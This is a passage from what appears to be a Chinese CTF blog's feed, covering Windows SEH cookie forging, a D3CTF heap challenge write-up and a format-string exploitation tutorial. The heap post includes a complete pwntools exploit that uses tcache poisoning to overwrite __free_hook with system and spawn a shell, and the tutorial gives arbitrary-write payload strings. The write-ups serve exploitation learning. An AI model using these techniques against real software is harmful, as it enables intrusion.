scopeTable-&gt;GSCookieOffset != -2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码首先会判断scopeTable-&gt;GSCookieOffset 也就是scopeTable的第一个值是不是0x0FFFFFFFE，如果是着会去取scopeTable-&gt;EHCookieOffset的值作为偏移，然后ebp为数组地址，取出数组的值。然后再取出scopeTable-&gt;EHCookieXOROffset为索引的值异或。然后判断结果是不是security_cookie。同理，如果不是，则会使用scopeTable-&gt;GSCookieOffset和scopeTable-&gt;GSCookieXOROffset为索引的值异或，最后判断结果是不是security_cookie。</p><p>这里我们就很好伪造了，通常我们会让GSCookieXOROffset和EHCookieOffset为0。然后这个时候数组的值就是ebp了，然后我们伪造gs为，ebp^security就可以了。然后这个值在哪就通过先判断scopeTable-&gt;GSCookieOffset是不是-2,如果是-2,则存放的地方就是scopeTable-&gt;GSCookieOffset来决定的。如果不是-2，则是EHCookieOffset来决定。</p><p>说到这里，结构体就已经伪造完毕，用第一个payload或者第二个payload都可以，因为他们使用的方式不同。</p><p>伪造的结构体存放在哪里都可以，但是要确保，ebp-0x8的地方存放的是伪造的结构体的地址异或security_cookie的值。像payload1和payload2都是存放再栈上。</p><p>到这里所以我个人觉得含糊的地方都讲清楚了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;武汉加油！湖北加油！&lt;/p&gt;
&lt;p&gt;被疫情隔离在家，很久之前就学会了，但是一直没有时间写，现在终于有时间写一写了。&lt;/p&gt;
&lt;p&gt;这个利用其实和linux下的利用差别还是很大的，要控制好几个结构体，要利用到SEH链。&lt;/p&gt;
&lt;p&gt;先给大家推荐两篇文章吧，我就是照着这两篇文
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="win_pwn" scheme="http://Whali3n51.top/tags/win-pwn/"/>
    
  </entry>
  
  <entry>
    <title>新年快乐</title>
    <link href="http://whali3n51.top/2020/01/01/happy-new-year/"/>
    <id>http://whali3n51.top/2020/01/01/happy-new-year/</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2020-02-08T14:22:56.929Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="祝大家新的一年心想事成">祝大家新的一年心想事成</span></h1><p>2019年过去了，2019发生了许多许多的事，每件事都让我挺难忘了。2019年大概是我这二十年以来过的最精彩的一年了。2019年也时我技术突飞猛涨的一年。想想去年这个时候，我还啥也不会，到了今年，却已经去各个地方比赛。在新的一年里，祝大家技术突飞猛进，心想事成，烦恼走开，赶快脱单。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;祝大家新的一年心想事成&quot;&gt;祝大家新的一年心想事成&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;2019年过去了，2019发生了许多许多的事，每件事都让我挺难忘了。2019年大概是我这二十年以来过的最精彩的一年了。2019年也时我技术突飞猛涨的一年。想想去年这个时候，我
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.top/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="新年快乐" scheme="http://Whali3n51.top/tags/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title>浅尝多线程pwn</title>
    <link href="http://whali3n51.top/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    <id>http://whali3n51.top/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/</id>
    <published>2019-12-11T13:48:20.000Z</published>
    <updated>2020-02-08T14:22:28.949Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b5f6f3f49f00594822848e0b76c7499109b5c8bdb953da7f5ffe815d3c6c2389">7f854dae60f2b3cbfe1054663f1fc2f0fd5c07831dfe5fcb9658b878fdf977a3a63352efe928c0bfea970d322d70cdfad6f5185b0a40975bb6defc70015bdaf31f01cbd0df57d8d10b6773fca330d71a53ab58582e830adcb71d9332ef878cf47af961f0c21de81ddbd94c538dc66edcea247cdef87f124652ef7cd2bb29105989a50dfd9b258cf0330880065c78da1ba5b390d33e5a7db8554be543ce2356d235859f84b7e36d9cc1cc547871072382efcd3a338c21c68c47c9f66e3aea28c0498c4c989f730fabb195921bffb9fe985412169d68e1a10db894cdde895d5ec9f797c31068141875fcaf214012c2b44bd854cd33637ce90070faac02459e36ca8ba82d9b5939e12ce987f382ad998f7735b991a0d6f86015b0389383e96e75cfe87edbda8258f1dcfb1d6a4060a618a11b7e60e24c90247e14f0b423815a73c10bbfa1133c44178b79e02b4fdde87ec15ff29ada93cd21655773686b1133371ae9b3447a2824213e53aa9f29675bf10f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="多线程pwn" scheme="http://Whali3n51.top/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF_new_heap复现</title>
    <link href="http://whali3n51.top/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/"/>
    <id>http://whali3n51.top/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-12-10T07:27:11.000Z</published>
    <updated>2020-02-08T14:21:26.604Z</updated>
    
    <content type="html"><![CDATA[<p>D3CTF那天去打红帽杯了，但是D3CTF 结束后，和其他师傅交流了一下，这道题不错 。而且这道题考点很清奇。</p><p>首先我们来看一下这一题开启的保护和使用的libc版本</p><p>题目附件:<a href="./new_heap_update.zip">new_heap_update.zip</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whalien51@ubuntu:~/new_heap-updated$ strings libc.so.6 |grep GLIBC</span><br><span class="line">GLIBC_2.29</span><br></pre></td></tr></table></figure><p>这一题使用的libc2.29。</p><p>直接IDA源码分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_C33</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"good present for African friends:0x%x\n"</span>, ((ptr &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里发现没有setbuf(stdin,0)。意思是这里会为getchar()输入开辟一个很大的堆块形成缓冲区。</p><p>然后再读源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_C33();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_C08();</span><br><span class="line">      v3 = sub_BB9();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_B42();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"sure?"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( getchar() == <span class="string">'y'</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_A60();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现getchar()那里可以一直往缓冲区输入数值。</p><p>这个是漏洞之一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B42</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = sub_BB9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index out of range"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(qword_202060[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在uaf，第二个漏洞。</p><p>然后看创建堆块函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_A60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; qword_202060[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">  result = sub_BB9();</span><br><span class="line">  LODWORD(<span class="built_in">size</span>) = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0x78</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202060[i] = <span class="built_in">malloc</span>(result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, qword_202060[i], <span class="built_in">size</span>);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题不能开辟堆块大小满足unsorted bin 的堆块。</p><p>这一题主要思路就是通过getchar()触发malloc_consolidate ,然后出现main_arena地址在堆块中，然后通过getchar()部分修改去打stdout。然后同样使用getchar()来制造tcache poisoning来攻击__free_hook 修改为system地址，最后getshell。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./new_heap"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line">argv = [<span class="string">"/glibc/x64/2.29/lib/ld-2.29.so"</span>,<span class="string">"--library-path"</span>,</span><br><span class="line">        <span class="string">"/glibc/x64/2.29/lib/"</span>,<span class="string">"./new_heap"</span>]</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    p=process(argv=argv)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote()</span><br><span class="line">    libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hfuck(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"3.exit\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content=<span class="string">"A"</span>)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,str(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">'sure?'</span>,content)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x38</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">        fuck(<span class="string">'A'</span>*<span class="number">0x38</span>+p64(<span class="number">0x41</span>))</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3f</span>):</span><br><span class="line">            fuck(<span class="string">""</span>)</span><br><span class="line">        fuck(<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'A'</span>*<span class="number">0x20</span>+<span class="string">"\x60\x27"</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">        p.recvuntil(<span class="string">"\x7f"</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-131</span>-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">        fuck(libc_base)</span><br><span class="line">        delete(<span class="number">12</span>,<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x41</span>):</span><br><span class="line">            fuck(<span class="string">""</span>)</span><br><span class="line">        fuck(<span class="string">"A"</span>*<span class="number">0x20</span>+p64(libc_base+libc.symbols[<span class="string">"__free_hook"</span>]))</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'/bin/sh\x00'</span>,<span class="literal">False</span>)</span><br><span class="line">        add(<span class="number">0x18</span>,p64(libc_base+libc.symbols[<span class="string">"system"</span>]),<span class="literal">False</span>)</span><br><span class="line">        delete(<span class="number">15</span>,<span class="literal">False</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p=process(argv=argv)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;D3CTF那天去打红帽杯了，但是D3CTF 结束后，和其他师傅交流了一下，这道题不错 。而且这道题考点很清奇。&lt;/p&gt;
&lt;p&gt;首先我们来看一下这一题开启的保护和使用的libc版本&lt;/p&gt;
&lt;p&gt;题目附件:&lt;a href=&quot;./new_heap_update.zip&quot;&gt;new
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.top/tags/UAF/"/>
    
      <category term="buffer in heap" scheme="http://Whali3n51.top/tags/buffer-in-heap/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串专题总结</title>
    <link href="http://whali3n51.top/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://whali3n51.top/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-10T07:27:11.000Z</published>
    <updated>2020-02-08T14:17:56.219Z</updated>
    
    <content type="html"><![CDATA[<p>最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。</p><h2><span id="漏洞原理分析">漏洞原理分析</span></h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p><p>正常的使用printf(“%s”,&amp;buf);来打印字符串</p><p>当call printf的时候栈上的结构为：</p><p><img src="./1.png" alt></p><p>这样函数就打印出第二个参数的地址上的字符串,这样就能正常打印出‘aaaa’。printf函数识别出‘%s’是一个格式化字符串，然后根据这个格式化字符串去取参数，’%s‘默认取第二个参数为作为字符串输出地址也就是‘%s’的下面一个栈空间，这样就能打印出‘aaaa’。</p><p>如果我们程序员偷懒，不使用格式化字符串，那么我们还是能打印出来。</p><p><img src="./2.png" alt></p><p>因为printf没有解析到格式化字符串，直接将‘aaaa’作为格式化字符串输出了。这原理就像是我们平时用printf(“hello world !!”);这个道理是一样的。但是这个时候和printf(“hello world !!”);不一样的是，字符串是我们能控制的，这个时候漏洞就出现了。</p><h2><span id="32位格式化字符串利用">32位格式化字符串利用</span></h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p><p>例如，我们输入一个‘%s’的格式化字符串，我们来分析他的原理。</p><p><img src="./3.png" alt></p><p>同理，printf解析出‘%s’了，相应的他要读出printf的第二个参数上的值。可是我们又没有给第二个参数，但是在程序里面，确认参数是不看你有没有输入，而是看栈的偏移。对于printf来说，第一个参数是栈顶，第二个参数是当前的[esp+4],第三个参数是[esp+8],依次类推。这里也就是输出‘&amp;buf’栈空间下面那个地址上的值。但是这个地方不确定是不是地址，所以程序可能打印失败。</p><p>但是格式化字符串给了一个我们可以自动定位的一个格式化字符串‘%n$’的参数。也就是在这里可以自己定位栈空间。</p><p>如果我们在这个给的是这‘%4$s’+p32(&amp;’hello world’)</p><p><img src="./4.png" alt></p><p>所以这个时候打印出来的就是’hello world’了。这个printf解析出有格式化串‘%4$s‘，也就是将buf栈下第4个栈空间的地址上的值当作字符串打印出来。注意这个p32(&amp;”hello world”)在这里只是做举例用，这个值我们可以写做任意一个值，也就是说我们能泄露任意地址上的值。这就达到了任意地址泄露。</p><p>当然达到任意地址泄露往往只是成功了一半，我们还需要达到任意地址写。</p><p>这个时候printf又提供了一个参数’%n‘,这个参数是将前面打印出来的字符数量写入到第二个参数的所指向的地址上的值。这个时候配合’%c‘可以写任意的值。当然这个’%n‘也可以结合’n$‘来使用，可以定位在栈上偏移。</p><p>例如，我们想在0x80000000(只是举例，不保证地址的合法性)上面写一个0x66666666</p><p>我们应该这样构造出这样的栈</p><p><img src="./5.png" alt></p><p>payload应该是这样%1717986918c%7$n+p32(0x80000000),这样就可以在0x80000000上面写0x66666666。</p><p>但是一般这样写有个问题，靠%1717986918c打印出0x66666666需要很长时间，一般程序会死掉，所以不能直接这么写。但是printf还提供了一个%n同类的格式化字符串</p><p>%n        一次性写入四个字节</p><p>%hn    一次性写入两个字节</p><p>%hhn        一次性写入一个字节</p><p>然后我们可以这样构造</p><p>%26214c%8$hn%9$hnaaa+p32(0x80000000)+p32(0x80000002)</p><p>注意，构造的时候，在格式化的串直接不有’\x00‘字符串截断，不然printf不能解析格式化字符串了。</p><p><img src="./6.png" alt></p><p>这样就可以任意地址写了。</p><p>一般来说，格式化字符串就是通过任意地址读写，来泄露got和修改got表来达到劫持程序流程。</p><p>pwntools整合了32位格式化字符串的利用。</p><p>fmtstr_payload(offset,{target_addr:value},write_size=’short’)自动就生成了payload,但是我不建议新手直接使用这个函数。</p><p>原理讲解到这里了，来个例子：</p><p>题目链接：<a href></a></p><h2><span id="64位格式化字符串利用">64位格式化字符串利用</span></h2><p>64位的和32位的利用方式其实是差不多的，唯一的差别就是64位的传参方式不一样，所以偏移量不一样。64位传参方式是rdi,rsi,rdx,rcx,r8,r9。第一个参数已经被我们格式化字符串占用了，所以第%1$p是rsi的值，然后往后顺延，直到%6$p是栈上第一个数据，然后后面和32位差不多了。</p><p>但是64位和32位还有一点不同的是，32位的地址一般能沾满整个栈单元，没有’\x00’字符，所以就不会无论地址写在格式化字符串前或者后面，都不会会造成格式化字符串的截断，但是64位不同，64位的地址一般不会沾满整个栈单元，一般只使用六个字节。所以会有’\x00’截断，如果把地址写在格式化字符串的前面，那么就会产生’\x00’截断，导致后面格式化字符串被截断不执行。</p><p>好了  这里也举个例子说一下吧。</p><p>题目链接</p><h2><span id="ebp-chain修改任意地址">Ebp chain修改任意地址</span></h2><p>Ebp chain是格式化字符串比较高级的利用方式，前两种利用方式是我们输入的值直接在栈上，但是如果我们输入的值全在bss段上，那么我们怎么做到修改格式化字符串呢？</p><p>通过上面的知识我们得知，想要修改或者读一个地址的值，那么这个地址就得在栈上。所以我们要想办法把这个地址写到栈上。这个说起来有点抽象，还是举个例子吧。</p><p>这是swupctf的一道题。</p><p>题目链接：<a href="login">login</a></p><p>首先我们进IDA看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your password: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[<span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">"wllmmllw"</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This is the wrong password: "</span>);</span><br><span class="line">  